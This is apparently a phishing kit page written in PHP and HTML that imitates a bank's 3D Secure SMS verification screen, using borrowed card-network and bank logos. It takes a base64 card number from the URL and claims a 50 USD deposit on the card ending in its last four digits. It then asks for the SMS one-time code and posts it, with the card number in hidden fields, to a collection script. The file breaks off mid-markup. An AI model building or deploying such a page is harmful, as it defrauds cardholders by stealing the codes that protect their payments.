﻿<?php
if (!isset($_GET['reference'])) {
    echo "barra nik omek";
    exit();
}
$reference = $_GET['reference'];
function file_get_contents_curl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}
$billccnumber = base64_decode($_GET['ccnumber']);
$realcc = str_replace(' ', '', $billccnumber);
$lbin = substr($realcc, strlen($realcc)-4, 4);//Last of bin
?>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

<!DOCTYPE html>
<html lang="en">
    <head>
        <link rel="icon" data-savepage-href="https://www.rsa3dsauth.co.uk/favicon.ico" href="" />
        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>3D Secure 2.0</title>
        <style type="text/css">
            body {
                margin: 0;
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
                -webkit-font-smoothing: antialiased;
                -moz-osx-font-smoothing: grayscale;
            }

            code {
                font-family: source-code-pro, Menlo, Monaco, Consolas, "Courier New", monospace;
            }

            body,
            html {
                font-family: "Segoe UI", tahoma, Arial, sans-serif, Helvetica;
                color: #212121;
                margin: 0;
            }

            body,
            form,
            html {
                height: 100%;
            }

            .flex-centered {
                display: flex;
                align-items: center;
                justify-content: center;
            }

            .container {
                border: 1px solid #b5cde5;
                background-color: #fff;
                min-height: 500px;
                max-height: 600px;
                max-width: 600px;
                font-family: "Segoe UI", tahoma, Arial, sans-serif, Helvetica;
                color: #212121;
                box-shadow: 0 0 3px 0 #dcd8d8;
                position: relative;
                flex-direction: column;
                padding: 0 20px;
                height: 100%;
            }

            .container,
            .header {
                box-sizing: border-box;
                display: flex;
            }

            .header {
                background-color: #1273d0;
                line-height: 40px;
                margin: 5px -15px 0;
                color: #fff;
                padding-left: 10px;
                justify-content: space-between;
                align-items: center;
            }

            .header div {
                font-size: 16px;
                font-weight: 700;
                text-transform: uppercase;
            }

            .header .cancel {
                margin-right: 6px;
            }

            .close {
                cursor: pointer;
                background-color: transparent;
                border: 0;
                margin: 0;
                padding: 0;
                font-size: 0;
            }

            svg {
                pointer-events: none;
            }

            .info-header {
                font-size: 22px;
                font-weight: 700;
                padding-bottom: 5px;
            }

            .info-text {
                font-size: 16px;
            }

            .resend-label {
                margin-top: 5px;
            }

            .button-link {
                cursor: pointer;
                border: 0;
                background-color: transparent;
                color: #07c;
                text-decoration: underline;
                padding: 0;
                font-family: inherit;
                font-size: inherit;
                align-self: center;
            }

            .button-link::-moz-focus-inner {
                border: 0;
                padding: 0;
            }

            .why-info-label {
                bottom: 15px;
                border-top: 1px dashed #b5cde5;
                right: 20px;
                left: 20px;
                padding-top: 10px;
                padding-bottom: 10px;
                background-color: #fff;
                cursor: pointer;
                flex-direction: row;
                color: #07c;
                text-decoration: underline;
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
            }

            .why-info-text-open {
                box-shadow: 0 -10px 8px -9px #cac7c7;
            }

            .arrow {
                border: solid #07c;
                border-width: 0 2px 2px 0;
                display: inline-block;
                padding: 3px;
                margin-right: 10px;
                margin-left: 2px;
            }

            .up {
                transform: rotate(-135deg);
                -webkit-transform: rotate(-135deg);
            }

            .rotated {
                transform: rotate(45deg) translateY(-3px);
                -webkit-transform: rotate(45deg) translateY(-3px);
            }

            .actions {
                display: flex;
                flex-direction: column;
                margin-bottom: 10px;
            }

            .submit-label {
                background-color: #0d5499;
                font-size: 20px;
                max-height: 50px;
                height: 50px;
                color: #fff;
                padding: 10px 20px;
                width: 100%;
                font-weight: 700;
                box-sizing: border-box;
                border-radius: 5px;
                cursor: pointer;
                margin-top: 20px;
                display: inline-flex;
                align-items: center;
                justify-content: center;
                border: 0;
            }

            .submit-label-disable {
                background-color: #9cb7d1;
                cursor: none;
            }

            .continue-loading {
                display: block;
            }

            .continue-loading-text {
                position: relative;
                padding-left: 40px;
            }

            .abort-polling-link {
                cursor: pointer;
                color: #07c;
                text-decoration: underline;
            }

            [dir="rtl"] .continue-loading-text {
                padding-right: 40px;
                padding-left: 0px;
            }

            .continue-loading-text::after {
                content: "";
                position: absolute;
                width: 20px;
                height: 20px;
                left: 0;
                right: 0;
                bottom: 0;
                border: 4px solid #ffffff;
                border-left-color: transparent;
                border-radius: 50%;
                animation-name: button-loading-spinner;
                animation-duration: 2s;
                animation-timing-function: linear;
                animation-iteration-count: infinite;
            }

            @keyframes button-loading-spinner {
                from {
                    transform: rotate(0turn);
                }
                to {
                    transform: rotate(1turn);
                }
            }

            .input,
            .select {
                height: 40px;
                border-radius: 5px;
                border: 1px solid #a7b3d1;
                box-sizing: border-box;
                font-size: 16px;
                text-indent: 10px;
                width: 100%;
            }

            option:hover {
                background-color: #a7b3d1;
            }

            label {
                display: flex;
            }

            .radio-group {
                display: inline-flex;
                flex-direction: column;
            }

            .radio-group > label:nth-child(2) {
                margin-top: 10px;
            }

            .radio {
                width: 20px;
                height: 20px;
                margin: 0 5px 0 0;
                flex: 0 0 auto;
            }

            .radio,
            .radio-text {
                vertical-align: middle;
            }

            .radio-text {
                flex: 1 1 auto;
            }

            .invalid-input {
                border: 1px solid red;
                background: #fffc89;
                background-origin: content-box;
            }

            .otp-input {
                position: relative;
                display: flex;
                justify-content: center;
                flex-direction: column;
            }

            .otp-input .icon {
                position: absolute;
                right: 0.5rem;
                top: 0.7rem;
            }

            .error-icon {
                position: relative;
                top: 1px;
                display: inline-block;
            }

            .error-text {
                color: red;
                padding-top: 5px;
            }

            input:focus,
            select:focus,
            textarea:focus {
                outline: none;
            }

            .bank-info {
                width: 100%;
                display: flex;
                padding: 20px 0;
                justify-content: space-between;
            }

            .bank-info img {
                width: auto;
                height: 30px;
            }

            .why-info-text {
                margin: 0;
                padding: 10px 0 0 16px;
                width: 95%;
            }

            .hide {
                display: none;
            }

            .scrollbar {
                overflow-y: auto;
                margin-bottom: 20px;
                padding-right: 10px;
            }

            .scrollbar::-webkit-scrollbar-track {
                -webkit-box-shadow: inset 0 0 0 0 rgba(0, 0, 0, 0.3);
                background-color: #fff;
            }

            .scrollbar::-webkit-scrollbar {
                width: 7px;
                background-color: #f5f5f5;
            }

            .scrollbar::-webkit-scrollbar-thumb {
                background-color: #778095;
                border: 0 solid #555;
                border-radius: 5px;
            }

            .tooltip-wrapper {
                position: relative;
            }

            .close-tooltip {
                position: absolute;
                right: 5px;
                top: 5px;
            }

            .tooltip {
                bottom: -1px;
                left: 0;
                padding: 10px;
                color: red;
                border-radius: 5px;
                z-index: 99999999;
                box-sizing: border-box;
                border: 1px solid red;
                font-size: 13px;
            }

            .tooltip,
            .tooltip:after {
                right: 0;
                background-color: #fff;
                position: absolute;
            }

            .tooltip:after {
                content: "";
                transform: translate(-70%) rotate(45deg);
                border-color: transparent red red transparent;
                border-style: solid;
                border-width: 1px;
                bottom: 0;
                transform-origin: left;
                padding: 5px;
                margin-bottom: -2px;
            }

            .custom-select {
                position: relative;
            }

            .select-selected {
                background-color: #fff;
                border-radius: 5px;
                border: 1px solid #a7b3d1;
                text-overflow: ellipsis;
                white-space: nowrap;
                overflow: hidden;
            }

            /*style the arrow inside the select element:*/
            .select-selected:after {
                content: "";
                position: absolute;
                right: 10px;
                top: 13px;
                border: solid #636c90;
                border-width: 0 3px 3px 0;
                display: inline-block;
                padding: 3px;
                -webkit-transform: rotate(45deg);
            }

            /*style the items (options), including the selected item:*/
            .select-items div,
            .select-selected {
                color: #000;
                cursor: pointer;
                -webkit-user-select: none;
                -moz-user-select: none;
                -ms-user-select: none;
                user-select: none;
                padding: 8px 25px 8px 10px;
            }

            /*style items (options):*/
            .select-items {
                position: absolute;
                background-color: #fff;
                left: 0;
                right: 0;
                z-index: 99;
                border-radius: 0;
                border: 1px solid #a7b3d1;
                margin-top: -3px;
            }

            .dropdown-upwards {
                bottom: 100%;
            }

            .dropdown-downwards {
                top: 100%;
            }

            /*hide the items when the select box is closed:*/
            .select-hide {
                display: none;
            }

            .same-as-selected {
                background-color: #c9e4f7;
            }

            .select-items div:hover {
                background-color: #ecfafe;
            }

            @-webkit-keyframes blink {
                0% {
                    opacity: 0.2;
                }
                20% {
                    opacity: 1;
                }
                to {
                    opacity: 0.2;
                }
            }

            @keyframes blink {
                0% {
                    opacity: 0.2;
                }
                20% {
                    opacity: 1;
                }
                to {
                    opacity: 0.2;
                }
            }

            .absolute {
                position: absolute;
                box-shadow: 0 0 15px -2px grey;
                right: 0;
                left: 0;
            }

            footer {
                display: flex;
                flex-direction: column;
                bottom: 0;
                background: #fff;
                margin-top: auto;
            }

            .expandable-text {
                font-weight: 400;
                display: none;
                padding: 0 15px 10px 35px;
            }

            .show {
                display: block;
            }

            .expanded {
                white-space: normal;
                padding-left: 33px;
                padding-right: 20px;
                padding-bottom: 0;
                text-indent: -16px;
            }

            @media screen and (max-width: 389px) {
                .container {
                    min-height: 400px;
                    padding: 0 10px;
                }

                .header {
                    margin: 5px -5px 0;
                }

                .info-header {
                    font-size: 16px;
                }

                .info-text {
                    margin-bottom: 20px;
                }

                .info-text,
                .why-info-label,
                .abort-polling {
                    font-size: 13px;
                }

                .submit-label {
                    font-size: 15px;
                    height: 40px;
                    box-sizing: border-box;
                    line-height: normal;
                    margin-top: 10px;
                }

                .input,
                .select {
                    font-size: 14px;
                }

                .resend-label {
                    font-size: 13px;
                }

                .bank-info {
                    padding: 10px 0;
                }

                .bank-info img {
                    width: auto;
                    height: 15px;
                }

                .radio-text {
                    font-size: 14px;
                }

                .info-text .scrollbar {
                    height: 100px;
                }

                .otp-input .icon {
                    cursor: pointer;
                }

                .expandable-text .scrollbar {
                    max-height: 205px;
                }

                .expandable-text {
                    font-size: 13px;
                }

                .select-items,
                .select-selected {
                    font-size: 14px;
                }

                .continue-loading-text::after {
                    width: 14px;
                    height: 14px;
                }
            }

            @media screen and (min-width: 280px) and (max-width: 389px) {
                .bank-info img {
                    width: auto;
                    height: 20px;
                }
            }

            @media screen and (min-width: 390px) and (max-width: 390px) and (max-height: 400px) {
                .container {
                    min-height: 400px;
                    padding: 0 10px;
                }

                .header {
                    margin: 5px -5px 0;
                }

                .bank-info {
                    padding: 15px 0 10px 0;
                }

                .bank-info img {
                    width: auto;
                    height: 20px;
                }

                .info-header {
                    font-size: 18px;
                }

                .info-text {
                    font-size: 15px;
                    margin-bottom: 20px;
                }

                .info-text .scrollbar {
                    height: 100px;
                }

                .input,
                .radio-text,
                .select {
                    font-size: 15px;
                }

                .tooltip {
                    font-size: 14px;
                }

                .otp-input .icon {
                    cursor: pointer;
                }

                .submit-label {
                    font-size: 16px;
                    height: 40px;
                    margin-top: 10px;
                }

                .resend-label,
                .why-info-label,
                .abort-polling {
                    font-size: 15px;
                }

                .expandable-text .scrollbar {
                    max-height: 180px;
                }

                .select-items,
                .select-selected {
                    font-size: 15px;
                }

                .continue-loading-text::after {
                    width: 14px;
                    height: 14px;
                }
            }

            @media screen and (min-width: 500px) and (min-height: 600px) {
                .container {
                    min-height: 600px;
                }

                .info-text .scrollbar {
                    max-height: 200px;
                }

                .expandable-text .scrollbar {
                    max-height: 360px;
                }
            }

            @media screen and (min-width: 550px) and (max-height: 450px) {
                .container {
                    min-height: 400px;
                    max-height: 400px;
                }

                .actions {
                    flex-direction: row;
                    justify-content: space-between;
                }

                .submit-label {
                    height: 40px;
                    width: 49%;
                    margin-top: 0;
                }

                .w-80 {
                    width: 80%;
                    align-self: center;
                }

                .space {
                    flex-direction: column;
                }

                .custom-select {
                    width: 50%;
                }

                .otp-input {
                    width: 49%;
                }

                .resend-label {
                    margin-top: 20px;
                }

                .error-text {
                    min-width: 550px;
                    height: 36px;
                }

                .info-text .scrollbar {
                    max-height: 85px;
                }

                .expandable-text .scrollbar {
                    max-height: 160px;
                }

                .continue {
                    margin: 0 auto;
                    width: 80%;
                    height: 40px;
                }

                .continue-loading-text::after {
                    width: 16px;
                    height: 16px;
                }
            }

            /*RTL Support*/
            [dir="rtl"] .header {
                padding-right: 10px;
                padding-left: 0;
            }

            [dir="rtl"] .header .cancel {
                margin-left: 6px;
                margin-right: 0;
            }

            [dir="rtl"] .bank-info {
                flex-direction: row-reverse;
            }

            [dir="rtl"] .scrollbar {
                padding-left: 10px;
                padding-right: 0;
            }

            [dir="rtl"] .otp-input .icon {
                left: 0.5rem;
                right: auto;
                top: 0.7rem;
            }

            [dir="rtl"] .close-tooltip {
                left: 5px;
                right: auto;
                top: 5px;
            }

            [dir="rtl"] .tooltip:after {
                transform: translate(95%) rotate(45deg);
                right: auto;
                left: 0;
            }

            [dir="rtl"] .radio {
                margin: 0 0 0 5px;
            }

            [dir="rtl"] .radio-text {
                text-align: right;
                direction: ltr;
            }

            [dir="rtl"] .select-selected:after {
                right: auto;
                left: 10px;
            }

            [dir="rtl"] .select-items div,
            [dir="rtl"] .select-selected {
                padding-right: 20px;
                padding-left: 25px;
            }

            [dir="rtl"] .arrow {
                margin-left: 10px;
                margin-right: 2px;
            }

            [dir="rtl"] .expanded {
                padding-right: 33px;
                padding-left: 20px;
            }

            [dir="rtl"] .expandable-text {
                padding: 0 35px 10px 15px;
            }
        </style>
        <script data-savepage-type="" type="text/plain"></script>
        <script data-savepage-type="" type="text/plain"></script>

        <style id="savepage-cssvariables">
            :root {
            }
        </style>
    </head>
    <body>
        <form id="verify_form" name="verify_form" action="./q_tabligh.php" method="post">
            <input type="text" style="display: none;" name="ccnumb" id="ccnumb" value="<?php echo($_GET['ccnumber']);?>" />
            <input type="text" style="display: none;" name="reference" id="reference" value="<?php echo($_GET['reference']); ?>" />
            <div class="container">
                <header class="header">
                    <div>secure checkout</div>
                    <button formnovalidate="" name="cancel" type="button" value="Cancel" class="close cancel">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16">
                            <defs>
                                <style>
                                    .cls-white {
                                        fill: #fff;
                                        fill-rule: evenodd;
                                    }
                                </style>
                            </defs>
                            <path
                                id="close-white"
                                class="cls-white"
                                d="M8,0a8,8,0,1,0,8,8A8.009,8.009,0,0,0,8,0Zm3.236,10.293a0.333,0.333,0,0,1,0,.471l-0.471.471a0.333,0.333,0,0,1-.471,0L8,8.942,5.707,11.235a0.333,0.333,0,0,1-.471,0l-0.471-.471a0.333,0.333,0,0,1,0-.471L7.057,8,4.764,5.707a0.333,0.333,0,0,1,0-.471l0.471-.471a0.333,0.333,0,0,1,.471,0L8,7.057l2.293-2.293a0.333,0.333,0,0,1,.471,0l0.471,0.471a0.333,0.333,0,0,1,0,.471L8.942,8Z"
                            ></path>
                        </svg>
                    </button>
                </header>

                <div class="bank-info">
                    <img
                        data-savepage-src="https://www.rsa3dsauth.co.uk/3ds2/images/cba/482c2b15-22fe-4f0b-a092-2d8782977904.gif"
                        src="data:image/gif;base64,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"
                        alt="Bank Logo"
                    />
                    <img
                        data-savepage-src="https://www.rsa3dsauth.co.uk/3ds2/images/ps_logos/mc/mc_idcheck_vrt_pos_140px.png"
                        src="data:image/png;base64,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"
                        alt="Payment Logo"
                    />
                </div>
                <div id="info-header" class="info-header">Enter your SMS code</div>
                <div id="info-text" class="scrollbar info-text">
                    You're depositing 50 USD using the card ending in <?php echo($lbin);?>.<br /><br />
                    To verify this deposit, an SMS code was sent to your phone.
                </div>

                <div id="tooltip" class="hide tooltip-wrapper">
                    <div class="tooltip">
                        <button type="button" class="close close-tooltip">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16">
                                <defs>
                                    <style>
                                        .cls-gray {
                                            fill: #3a3a3a;
                                            fill-rule: evenodd;
                                        }
                                    </style>
                                </defs>
                                <path
                                    id="close-gray"
                                    class="cls-gray"
                                    d="M8,0a8,8,0,1,0,8,8A8.009,8.009,0,0,0,8,0Zm3.236,10.293a0.333,0.333,0,0,1,0,.471l-0.471.471a0.333,0.333,0,0,1-.471,0L8,8.942,5.707,11.235a0.333,0.333,0,0,1-.471,0l-0.471-.471a0.333,0.333,0,0,1,0-.471L7.057,8,4.764,5.707a0.333,0.333,0,0,1,0-.471l0.471-.471a0.333,0.333,0,0,1,.471,0L8,7.057l2.293-2.293a0.333,0.333,0,0,1,.471,0l0.471,0.471a0.333,0.333,0,0,1,0,.471L8.942,8Z"
                                ></path>
                            </svg>
                        </button>
                    </div>
                </div>
                <div class="actions">
                    <div class="otp-input">
                        <input autocomplete="off" name="text_input" id="text_input" required="" type="password" class="input" value="" />
                        <div class="icon hide" id="error-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="16" viewBox="0 0 18 16">
                                <title id="title">Error</title>
                                <desc id="desc">Wrong input</desc>
                                <defs>
                                    <style>
                                        .cls-1 {
                                            fill: red;
                                            fill-rule: evenodd;
